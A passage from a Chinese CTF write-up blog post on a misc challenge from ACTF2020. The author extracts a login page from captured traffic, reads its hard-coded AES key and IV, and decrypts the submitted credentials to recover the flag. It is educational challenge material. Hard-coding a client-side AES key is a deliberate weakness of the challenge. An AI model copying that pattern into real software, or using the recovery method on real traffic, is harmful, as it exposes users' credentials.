<li><p>考察点：流量分析、AES加密</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：200</p>
</li>
<li><p>完成人数：4</p>
</li>
</ul>
<p>流量分析，能提取出<code>login.html</code>的网页源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.4.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8="</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> key = CryptoJS.enc.Utf8.parse(<span class="string">"1234123412ABCDEF"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> iv = CryptoJS.enc.Utf8.parse(<span class="string">'ABCDEF1234123412'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">checkform_login</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> ($(<span class="string">"#username"</span>).val() == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#username"</span>).focus();</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">"请输入您的账号！"</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($(<span class="string">"#password"</span>).val() == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#password"</span>).focus();</span></span><br><span class="line"><span class="actionscript">                    alert(<span class="string">"请输入您的密码！"</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#u_dlcode"</span>).val(Encrypt($(<span class="string">"#username"</span>).val()))</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#p_dlcode"</span>).val(Encrypt($(<span class="string">"#password"</span>).val()))</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    $(<span class="string">"#form_login_true"</span>).submit();</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> <span class="literal">true</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">//加密方法</span></span></span><br><span class="line"><span class="actionscript">            <span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span><span class="params">(word)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> srcs = CryptoJS.enc.Utf8.parse(word);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> encrypted = CryptoJS.AES.encrypt(srcs, key, &#123;</span></span><br><span class="line">                    iv: iv,</span><br><span class="line">                    mode: CryptoJS.mode.CBC,</span><br><span class="line">                    padding: CryptoJS.pad.Pkcs7</span><br><span class="line">                &#125;);</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> encrypted.ciphertext.toString().toUpperCase();</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form_login"</span> <span class="attr">name</span>=<span class="string">"form_login"</span> <span class="attr">action</span>=<span class="string">"javascript:;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">maxlength</span>=<span class="string">"20"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">id</span>=<span class="string">"dlbutton"</span> <span class="attr">value</span>=<span class="string">"登录系统"</span> <span class="attr">onclick</span>=<span class="string">"checkform_login()"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--用户输入完成后，真实POST提交的表单 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form_login_true"</span> <span class="attr">name</span>=<span class="string">"form_login_true"</span> <span class="attr">action</span>=<span class="string">"index.html"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"u_dlcode"</span> <span class="attr">id</span>=<span class="string">"u_dlcode"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"p_dlcode"</span> <span class="attr">id</span>=<span class="string">"p_dlcode"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>用户名和密码经AES加密后提交给表单，加密后的用户名为<code>u_dlcode</code>，密码为<code>p_dlcode</code>，分别能在下一个包中找到：</p>
<blockquote>
<p>key = 1234123412ABCDEF</p>
<p>iv = ABCDEF1234123412</p>
<p>u_dlcode = F6889AA527EA40FB0A2AECC5A28A694E</p>
<p>p_dlcode = 0D2FD588668054DA021349541E5CB64F55979D02E41C75E0CE0233F6D10E31251B40CB8E197404F9E261FBA573E09191</p>
<p>mode: CBC<br>padding: Pkcs7</p>
</blockquote>
<p>在这里<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">解密</a>，得到用户名为<code>admin</code>，密码即为flag：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/login/login.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="login" class="fancybox"><img alt="login" title="login" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/login/login.png" src="/img/loading.gif" class="lazyload"></a></p>
<hr>
<h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>感谢承办单位中南大学<a href="http://www.csuaurora.org/" target="_blank" rel="noopener">极光网络安全实验室</a> </p>
<p>感谢以及各位出题、验题的师傅们的付出，很不错的比赛，为寒假宅在家的我增添了不少乐趣~</p>
<p>祝ACTF越办越好~</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">TaQini</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://taqini.space/2020/02/13/ACTF2020-writeup/">http://taqini.space/2020/02/13/ACTF2020-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://taqini.space">TaQini</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF    </a><a class="post-meta__tags" href="/tags/pwn/">pwn    </a><a class="post-meta__tags" href="/tags/writeup/">writeup    </a><a class="post-meta__tags" href="/tags/re/">re    </a><a class="post-meta__tags" href="/tags/misc/">misc    </a><a class="post-meta__tags" href="/tags/ROP/">ROP    </a><a class="post-meta__tags" href="/tags/shellcode/">shellcode    </a><a class="post-meta__tags" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移    </a><a class="post-meta__tags" href="/tags/shell%E5%9F%BA%E7%A1%80/">shell基础    </a><a class="post-meta__tags" href="/tags/RSA/">RSA    </a><a class="post-meta__tags" href="/tags/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0/">无符号整数    </a><a class="post-meta__tags" href="/tags/free-hook/">free_hook    </a><a class="post-meta__tags" href="/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型    </a><a class="post-meta__tags" href="/tags/abs%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/">abs函数漏洞    </a><a class="post-meta__tags" href="/tags/IO-FILE/">_IO_FILE    </a><a class="post-meta__tags" href="/tags/fsb/">fsb    </a><a class="post-meta__tags" href="/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析    </a><a class="post-meta__tags" href="/tags/%E7%88%86%E7%A0%B4/">爆破    </a><a class="post-meta__tags" href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">动态调试    </a><a class="post-meta__tags" href="/tags/%E8%87%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/">自修改代码    </a><a class="post-meta__tags" href="/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程    </a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入    </a><a class="post-meta__tags" href="/tags/python/">python    </a><a class="post-meta__tags" href="/tags/githack/">githack    </a><a class="post-meta__tags" href="/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">php文件包含    </a><a class="post-meta__tags" href="/tags/HTTP%E5%8D%8F%E8%AE%AE/">HTTP协议    </a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计    </a><a class="post-meta__tags" href="/tags/md5%E7%BB%95%E8%BF%87/">md5绕过    </a><a class="post-meta__tags" href="/tags/XXE/">XXE    </a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行    </a><a class="post-meta__tags" href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/">维吉尼亚密码    </a><a class="post-meta__tags" href="/tags/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/">zip伪加密    </a><a class="post-meta__tags" href="/tags/AES/">AES    </a><a class="post-meta__tags" href="/tags/base64%E9%9A%90%E5%86%99/">base64隐写    </a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/">文件修复    </a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析    </a><a class="post-meta__tags" href="/tags/outguess%E9%9A%90%E5%86%99/">outguess隐写    </a><a class="post-meta__tags" href="/tags/web/">web    </a><a class="post-meta__tags" href="/tags/crypto/">crypto    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/wechat.png" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/02/14/play-ROP-with-fini-array/"><img class="prev_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200214140258.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>通过利用fini_array部署并启动ROP攻击</span></div></a></div><div class="next-post pull_right"><a href="/2020/02/12/start-with-hexo/"><img class="next_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212191301.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>Hexo博客搭建指南</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/02/12/2020-Hgame-pwn-writeup/" title="Hgame 2020 pwn writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212030429.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">Hgame 2020 pwn writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/18/pwn-docker/" title="CTFd一键部署Pwn题目动态靶机"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/CTFq_pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-18</div><div class="relatedPosts_title">CTFd一键部署Pwn题目动态靶机</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/23/ACTF2020-scp-foundation-writeup/" title="ACT2020 SCP_Foundation writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-23</div><div class="relatedPosts_title">ACT2020 SCP_Foundation writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/16/sarctf-writeup/" title="SarCTF Write(吐)Up(嘈)"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/new-sar.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-16</div><div class="relatedPosts_title">SarCTF Write(吐)Up(嘈)</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/21/MetasequoiaCTF-writeup/" title="MetasequoiaCTF writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221201016.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-21</div><div class="relatedPosts_title">MetasequoiaCTF writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/19/pwn-technique/" title="Pwn小技巧总结"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-19</div><div class="relatedPosts_title">Pwn小技巧总结</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = false == true ? true : false;
var verify = false == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;

window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'Tu31dQ33uvFY2kl0vb9CUB2G-gzGzoHsz',
  appKey:'zG8YkmUIiJdhdwPnJUglqERS',
  placeholder:'留下你的小脚印吧~',
  avatar:'monsterid',
  guest_info:guest_info,
  pageSize:'10',
  lang:'zh-cn',
  recordIP: true
});</script></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By TaQini</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">欢迎来到我的博客~</div><div class="icp"><a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>京ICP备20005724号-1</span></a></div><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="240" height="120" src="//music.163.com/outchain/player?type=0&amp;id=4935952990&amp;auto=1&amp;height=90"></iframe></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-share" id="weixin" title="微信分享"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="http://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/fireworks.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"position":"left","width":150,"height":300,"hOffset":20,"vOffset":-90},"mobile":{"show":true,"scale":1},"react":{"opacityDefault":0.3,"opacityOnHover":0.3,"opacity":0.95},"log":false});</script></body></html>